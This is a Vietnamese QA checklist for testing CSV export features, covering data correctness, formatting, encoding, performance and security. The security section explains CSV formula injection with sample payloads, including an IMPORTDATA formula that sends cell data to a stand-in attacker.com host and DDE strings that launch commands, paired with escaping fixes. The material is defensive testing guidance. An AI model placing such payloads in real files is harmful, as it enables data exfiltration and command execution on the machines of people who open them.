# Guide: CSV Export Test Coverage

Dùng khi viết TVP cho màn hình có **chức năng xuất file CSV**.

> **Lưu ý sử dụng**: File này là **checklist kịch bản** — liệt kê _cần test cái gì_ và _cần verify điểm nào_.
> Expected Result trong TVP phải được viết dựa vào **spec của project**, không copy từ guide này.
> Cột "Verify Points" chỉ nhắc những góc kiểm tra cần có, không prescribe kết quả cụ thể.

---

## Khung 8 lớp kiểm thử Export

Export dễ bị bỏ sót lớp **B** (data correctness) và **H** (CSV injection) — hai lớp ít hiển thị lỗi trên UI nhưng có impact nghiêm trọng:

| Lớp | Scope | Ưu tiên |
|-----|-------|---------|
| **A — Input / Filter level** | Scope query: không filter, có filter, filter boundary | High |
| **B — Data correctness** | File = DB? Không thiếu/dư record? Sort đúng? | **CRITICAL** |
| **C — Format level** | Header, delimiter, escape ký tự đặc biệt, date/number format, null mapping | High |
| **D — Encoding level** | Encoding, BOM, ký tự đa byte | High |
| **E — File level** | Filename, extension, file không corrupt, download trigger | Medium |
| **F — Edge cases** | 0 record, 1 record, max record | Medium |
| **G — Performance** | Thời gian xử lý, timeout, memory leak, concurrency | Medium |
| **H — Security** | CSV Injection, unauthorized access | High |

**Quy tắc**: Không dùng TVP "file download thành công" làm catch-all cho lớp B~C.

> ⚠️ **Khi tạo TVP từ guide này**: Mã kịch bản (A-01, B-02…) chỉ dùng để đối chiếu nội bộ — **không đặt vào cột Feature** của TVP output. Cột **Sub-section** dùng tên chiều kiểm thử (`Validation`, `Negative`, `Edge Case`…), không dùng tên Section lớn (`CSV Export`).

---

## A — Input / Filter level

| # | Kịch bản | Test Type | Điều kiện áp dụng | Verify Points |
|---|----------|-----------|------------------|---------------|
| A-01 | Export **không filter** (baseline) | Functional | Luôn | Record count khớp toàn bộ active records trong DB |
| A-02 | Export **với filter active** | Functional | Nếu màn hình có filter/search | Chỉ records khớp filter được export; records ngoài filter không xuất hiện; vượt phân trang (không chỉ trang đang xem) |
| A-03 | Export với filter **không trả data** | Edge Case | Nếu có filter | File content (chỉ header hay hoàn toàn empty — tra spec), không có server error |
| A-04 | Export từ **trang N** (không phải trang 1) với filter | Functional | Nếu có phân trang | File chứa toàn bộ records khớp filter, không chỉ trang đang xem |
| A-05 | Filter **boundary** (date range lớn, giá trị ở ranh giới) | Edge Case | Nếu filter có giá trị biên (date range, number range) | Records ở ranh giới có được include đúng không |

> **Quy tắc A-01/A-02**: Phải có cả 2 case — baseline (no filter) VÀ with-filter. Thiếu A-01 là bỏ sót happy path cơ bản nhất.

---

## B — Data correctness ⚠️ CRITICAL

**Đây là lớp quan trọng nhất và thường bị bỏ sót nhất.** Lỗi ở lớp này không hiển thị trực tiếp trên UI nhưng gây sai dữ liệu trong báo cáo/downstream — thường chỉ phát hiện khi đối chiếu file với DB.

| # | Kịch bản | Test Type | Điều kiện áp dụng | Verify Points |
|---|----------|-----------|------------------|---------------|
| B-01 | **Không thiếu record**: đếm record trong file | Data Integrity | Luôn | Count trong CSV = COUNT(*) FROM table WHERE filter AND deleted_at IS NULL |
| B-02 | **Không dư record**: kiểm tra record bị loại trừ | Data Integrity | Luôn | Soft-deleted records không có trong CSV; records ngoài filter không có |
| B-03 | **Sort order**: thứ tự bản ghi trong CSV | Data | Nếu màn hình có default sort | Sort order trong CSV khớp default sort của màn hình theo spec |
| B-04 | **Data khớp DB**: giá trị từng cột | Data Integrity | Luôn | Giá trị CSV = DB value tại thời điểm export; không bị transform sai; không bị swap cột |

### Quy tắc round-trip (CRITICAL)

> **Nguyên tắc**: Nếu màn hình có cả Import lẫn Export — giá trị xuất ra trong CSV phải có thể Import lại mà không bị validation error.

Kiểm tra từng cột: *"Nếu tôi export file này rồi import lại, cột X có pass validation không?"*

| Ví dụ | Import nhận | Export phải xuất | Sai nếu xuất |
|-------|------------|-----------------|--------------|
| Postal code | 7 chữ số không gạch | `9100854` | `〒910-0854` hoặc `910-0854` |
| Phone | Pattern nội địa Nhật | `058-123-4567` | `+81-58-1234567` |
| Status | JP value | `契約` | `CONTRACT` |

> Bảng trên là **ví dụ minh họa** — giá trị cụ thể phải tra spec của project.

---

## C — Format level

### C-1: Header

| # | Kịch bản | Test Type | Điều kiện áp dụng | Verify Points |
|---|----------|-----------|------------------|---------------|
| C-01 | Header row: tên cột | Functional | Luôn | Đúng label theo spec/template; không bị dịch hay thay đổi |
| C-02 | Header row: thứ tự cột | Functional | Luôn | Đúng thứ tự theo spec |
| C-03 | Header row: số lượng cột | Functional | Luôn | Không thừa, không thiếu cột so với spec |

> **Quy tắc**: Header Export phải khớp header Import template (nếu màn hình có cả 2). Sai thứ tự → re-import bị lệch cột dữ liệu.

### C-2: Data format per column

Với mỗi **cột** trong file CSV, xác định output format theo spec. Đơn vị tối thiểu: **1 cột × 1 nhóm rule = 1 TVP**.

| Loại cột | Kịch bản cần test | Verify Points |
|----------|------------------|---------------|
| **Required text** | Giá trị bình thường | Giá trị xuất nguyên gốc từ DB |
| **Optional text (null)** | Field null trong DB | CSV output là empty string `""`, không phải `"null"` / `"-"` / `"ー"` — tra spec |
| **Optional text (empty string)** | Field = `""` trong DB | CSV output là empty string |
| **Enum / Status** | DB value → CSV | DB value hay display value được export — tra spec; nhất quán với Import template |
| **Postal code** | DB lưu chuỗi số | Format trong CSV — tra spec (có gạch nối không, có ký hiệu không) |
| **Date** | Format ngày trong DB | Format trong CSV theo spec (YYYY-MM-DD, YYYY/MM/DD, v.v.) |
| **Number** | Số nguyên / decimal | Không thêm separator nghìn (`,`); không mất decimal precision |
| **Boolean** | `true`/`false` | Output theo spec — tra spec: `はい`/`いいえ`, `1`/`0`, `TRUE`/`FALSE` |
| **Phone / FAX** | Giá trị có ký tự đặc biệt | Xuất nguyên gốc; không mất leading zero |

**Null mapping rule (CRITICAL)**:
- ❌ Null → `"-"`: đây là display behavior của UI, **không** phải CSV content
- ✅ Null → `""` (empty string): nếu xuất `"-"` thì re-import treat như valid value → dirty data

### C-3: Escape ký tự đặc biệt

| # | Kịch bản | Test Type | Điều kiện áp dụng | Verify Points |
|---|----------|-----------|------------------|---------------|
| C-04 | Nội dung cột có **dấu phẩy** (`,`) | Edge Case | Delimiter là comma; field text tự do | Giá trị có được wrap trong `"..."` không |
| C-05 | Nội dung cột có **dấu nháy đôi** (`"`) | Edge Case | Field text tự do | Ký tự `"` có được escaped thành `""` không |
| C-06 | Nội dung cột có **newline** | Edge Case | Field text tự do | File structure không bị phá vỡ; escape behavior theo spec |
| C-07 | **Date format** khi mở bằng Excel | Data | Field kiểu date | Excel không auto-convert format (ví dụ YYYY-MM-DD thành MM/DD/YYYY) |
| C-08 | **Number / code format** khi mở bằng Excel | Data | Field kiểu number / code | Leading zero không bị strip; separator nghìn không được thêm |
| C-09 | Delimiter của file | Functional | Nếu spec quy định | Delimiter khớp spec (comma `,` hoặc semicolon `;`) |

> **C-08 note**: Excel auto-converts `0600001` → `600001` khi mở CSV. Fix bằng format cột text (tab prefix, `=` prefix) — phụ thuộc spec; nếu không rõ → `[⚠️ Need Confirm]`.

---

## D — Encoding level

| # | Kịch bản | Test Type | Điều kiện áp dụng | Verify Points |
|---|----------|-----------|------------------|---------------|
| D-01 | Mở file export bằng Excel / text editor — encoding theo spec project | Functional | Luôn — đặc biệt quan trọng với dự án đa ngôn ngữ | Ký tự đa byte (tiếng Nhật, tiếng Việt) hiển thị đúng; không bị vỡ font; encoding khớp spec |
| D-02 | Ký tự đặc biệt (é, ñ, 日本語, `¥`, `©`) trong dữ liệu | Data | Field chứa ký tự đa ngôn ngữ hoặc ký tự đặc biệt | Xuất đúng; không bị replace bằng `?` hoặc `□` |

> **Case kinh điển**: File CSV mở bằng Excel bị vỡ font — nguyên nhân hầu hết là thiếu BOM hoặc sai encoding. Encoding cụ thể tra theo spec project.

---

## E — File level

| # | Kịch bản | Test Type | Điều kiện áp dụng | Verify Points |
|---|----------|-----------|------------------|---------------|
| E-01 | **Filename format** của file download | Functional | Nếu spec quy định tên file | Tên file khớp pattern trong spec (ví dụ: `マスタ名_YYYYMMDD.csv`) |
| E-02 | **File extension** | Functional | Luôn | Extension là `.csv` |
| E-03 | File **không corrupt** | Functional | Luôn | Có thể mở và đọc toàn bộ nội dung; không bị truncate |
| E-04 | **Download trigger** | Functional | Luôn | Browser nhận file; không bị block bởi browser security policy |
| E-05 | Nút Export khi đang xử lý | User Behavior | Luôn | Nút disabled hay không; có tạo double-download không |

---

## F — Edge cases

| # | Kịch bản | Test Type | Điều kiện áp dụng | Verify Points |
|---|----------|-----------|------------------|---------------|
| F-01 | **0 bản ghi** | Edge Case | Luôn | File content theo spec — chỉ header row hay hoàn toàn empty? [⚠️ Confirm spec]; không có server error |
| F-02 | **1 bản ghi** | Edge Case | Luôn | Đúng 1 dòng data; format đúng; không bị trim hay duplicate |
| F-03 | **Max bản ghi** (theo spec hoặc estimated max) | Edge Case | Nếu có giới hạn số records hoặc dataset lớn | Export đủ số lượng; không bị cắt bớt |

---

## G — Performance

| # | Kịch bản | Test Type | Điều kiện áp dụng | Verify Points |
|---|----------|-----------|------------------|---------------|
| G-01 | Export dataset lớn (10k / 100k records tùy spec) | Performance | Nếu có SLA hoặc dataset lớn | Response time; có timeout không |
| G-02 | Export dataset lớn — server resource | Performance | Nếu hệ thống nhiều user hoặc export thường xuyên | Server không memory leak; request tiếp theo vẫn xử lý bình thường |
| G-03 | **Concurrent export** (2 user cùng click Export) | Concurrency | Nếu hệ thống multi-user | Không lỗi; mỗi user nhận đúng file của mình |
| G-04 | Export trong khi Import đang xử lý | Concurrency | Nếu hệ thống cho phép concurrent import/export | File export không chứa data partial (snapshot consistency) |

---

## H — Security

| # | Kịch bản | Test Type | Điều kiện áp dụng | Verify Points |
|---|----------|-----------|------------------|---------------|
| H-01 | **CSV Injection**: giá trị cột bắt đầu bằng `=`, `+`, `-`, `@` | Security | **Luôn** — field text tự do bất kỳ có thể chứa các ký tự này | Ký tự nguy hiểm có được escape không; Excel không execute formula khi mở file |
| H-02 | User không có quyền export | Security | Nếu màn hình có RBAC | Nút ẩn/disabled trên UI; gọi API trực tiếp trả 403 |
| H-03 | Dữ liệu nhạy cảm (PII, lương, mật khẩu) | Security | Nếu có column-level permission | Chỉ xuất nếu user có quyền xem field đó |

### CSV Injection — Giải thích & ví dụ

Khi cell bắt đầu bằng `=`, `+`, `-`, `@` → Excel/Google Sheets treat as formula → có thể execute code khi victim mở file:

```
Ví dụ nội dung cell nguy hiểm:
  =IMPORTDATA("http://attacker.com/steal?data="&A1)
  =cmd|'/C calc'!A0
  -2+3+cmd|'/C calc'!A0
  @SUM(1+1)*cmd|'/C calc'!A0
```

**Fix**: Prepend `'` (single quote) trước giá trị bắt đầu bằng `=`, `+`, `-`, `@`:
```
DB value: "=DA01"  →  CSV output: "'=DA01"
DB value: "+8123"  →  CSV output: "'+8123"
```

> **Quy tắc viết Expected Result H-01**: Nếu DB có giá trị `=DA01`, file CSV phải chứa `'=DA01` (hoặc cách escape theo spec) — không phải `=DA01` nguyên gốc. Test bằng cách mở file với Excel macro enabled và verify không có formula execution.

---

## Anti-pattern — Cấm dùng TVP generic catch-all

❌ **Sai**: Chỉ viết 1 TVP "Click Export → file download thành công" rồi kết thúc.

> TVP này chỉ cover E-03/E-04 (file exists + download). Không cover: data correctness (B), null mapping (C), CSV injection (H), filter scope (A).

✅ **Đúng**: TVP "happy path download" vẫn cần — nhưng **song song** với TVP riêng cho từng lớp:

| TVP | Mục đích |
|-----|----------|
| TVP generic "Export thành công" | File download OK |
| TVP per Layer B | Record count đúng; không thiếu/dư; sort đúng |
| TVP per Layer C (per column) | Null → empty; format date/number; escape ký tự đặc biệt |
| TVP Layer H | CSV Injection được escape trước khi xuất file |

---

## Quy tắc viết Expected Result trong TVP

Expected Result **phải tra spec**, không lấy từ guide này. Khi viết:

1. **Ghi rõ CSV content** — không chỉ viết "file được download"
   - ✅ `Cột 郵便番号 trong CSV = "9100854"` (format theo spec)
   - ❌ `File CSV chứa dữ liệu đúng`

2. **Ghi rõ null behavior theo spec**
   - ✅ `Field 担当者名 null trong DB → cột CSV = "" (empty string)` — giá trị cụ thể tra spec
   - ❌ `Field null → hiển thị rỗng` (mơ hồ)

3. **Ghi rõ record count** khi test scope
   - ✅ `File CSV chứa N bản ghi = COUNT(*) FROM table WHERE <filter> AND deleted_at IS NULL`

4. **Ghi rõ CSV Injection escape** khi test H-01
   - ✅ `Giá trị DB "=DA01" → trong CSV xuất là "'=DA01"` (hoặc escape pattern theo spec)

5. **Nếu spec không mô tả behavior** → ghi `[⚠️ Need Confirm]`, không tự suy đoán

---

## Lưu ý project-specific

- **Encoding**: Tra spec để xác định encoding yêu cầu (UTF-8, UTF-8 BOM, Shift-JIS…) — 1 TVP verify mở bằng Excel không vỡ ký tự (Layer D)
- **Leading zero**: Cột dạng mã/code (郵便番号, 社員番号, mã nhân viên) bị Excel strip zero → confirm cách handle theo spec; nếu không rõ → `[⚠️ Need Confirm]`
- **Round-trip**: Nếu màn hình có cả Import lẫn Export — luôn verify Export format ↔ Import format tương thích (xem quy tắc lớp B)
- **Display ≠ CSV**: Luôn phân biệt "hiển thị trên UI" và "nội dung file CSV" — hai layer thường khác nhau (null display `"-"` vs CSV `""`, postal code display `〒910-0854` vs CSV `9100854`)
- **CSV Injection**: Dễ bị bỏ qua vì không hiển thị lỗi trên UI — chỉ phát hiện khi mở file bằng Excel với macro setting; tester cần enable macro để verify H-01
